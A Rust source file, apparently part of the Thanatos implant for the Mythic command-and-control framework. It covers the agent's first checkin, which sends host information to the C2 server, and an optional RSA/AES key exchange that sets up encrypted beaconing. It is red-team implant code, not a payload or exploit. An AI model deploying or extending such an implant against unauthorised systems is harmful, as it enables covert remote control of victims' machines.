use std::marker::PhantomData;

use serde::{Deserialize, Serialize};

use crate::{
    agent::{checkin, MythicStatus},
    crypto::{base64, errors::CryptoError, rsa::Rsa},
    errors::ThanatosError,
};

use super::{
    checkin::CheckinData,
    errors::AgentError,
    running::Running,
    traits::{private::Sealed, AgentState, BeaconingState},
    Agent, MythicMessage, MythicResponse,
};

#[derive(Serialize)]
pub struct StagingRsaMessage<'a> {
    pub_key: String,
    session_id: &'a str,
}

#[derive(Deserialize)]
pub struct StagingRsaResponse {
    uuid: String,
    session_key: String,
    session_id: String,
}

#[derive(Serialize)]
pub struct CheckinMessage {
    uuid: String,

    #[serde(flatten)]
    data: CheckinData,
}

pub struct Initialized;
impl Sealed for Initialized {}
impl AgentState for Initialized {}
impl BeaconingState for Initialized {}

impl Agent<Initialized> {
    pub fn checkin(mut self, eke: bool) -> Result<Agent<Running>, ThanatosError> {
        let uuid = self.uuid.clone();

        if eke {
            self.perform_key_exchange()?;
        }

        let message = MythicMessage::Checkin(CheckinMessage {
            uuid,
            data: checkin::checkin_info(),
        });

        match self.try_send(message)? {
            MythicResponse::Checkin { id, status } => {
                if status != MythicStatus::Success {
                    return Err(ThanatosError::Agent(AgentError::MythicError));
                }
                self.uuid = id;
            }
            _ => return Err(ThanatosError::Agent(AgentError::UnexpectedResponse)),
        }

        Ok(Agent {
            uuid: self.uuid,
            connection_retries: self.connection_retries,
            working_start: self.working_start,
            working_end: self.working_end,
            killdate: self.killdate,
            callback_interval: self.callback_interval,
            callback_jitter: self.callback_jitter,
            aes_key: self.aes_key,
            profile: self.profile,
            rng: self.rng,
            _s: PhantomData,
        })
    }

    fn perform_key_exchange(&mut self) -> Result<(), ThanatosError> {
        let rsa_key = Rsa::generate(4096).map_err(ThanatosError::Crypto)?;
        let pubkey = base64::encode(&rsa_key.public_key().map_err(ThanatosError::Crypto)?);
        let session_id: &str =
            &base64::encode(self.rng.gen_bytes::<{ 3 * 20usize.div_ceil(3) }>())[..20];

        let message = MythicMessage::StagingRsa(StagingRsaMessage {
            pub_key: pubkey,
            session_id,
        });

        let orig_interval = self.callback_interval;

        // Cut the sleep interval in half for the key exchange
        if self.callback_interval > 1 {
            self.callback_interval = self.callback_interval.saturating_div(2);
        }

        let resp = self.try_send(message)?;

        let msg = match resp {
            MythicResponse::StagingRsa(msg) => msg,
            _ => return Err(ThanatosError::Agent(AgentError::UnexpectedResponse)),
        };

        self.uuid = msg.uuid;

        if session_id != msg.session_id.as_str() {
            return Err(ThanatosError::Agent(AgentError::SessionidMismatch));
        }

        let aes_key = base64::decode(msg.session_key)
            .map_err(|e| ThanatosError::Crypto(CryptoError::Base64(e)))?;

        self.aes_key = Some(
            rsa_key
                .private_decrypt(&aes_key)
                .map_err(ThanatosError::Crypto)?
                .try_into()
                .map_err(|_| ThanatosError::Agent(AgentError::EkeAesKeyInvalid))?,
        );

        // Restore original sleep interval
        self.callback_interval = orig_interval;

        Ok(())
    }
}
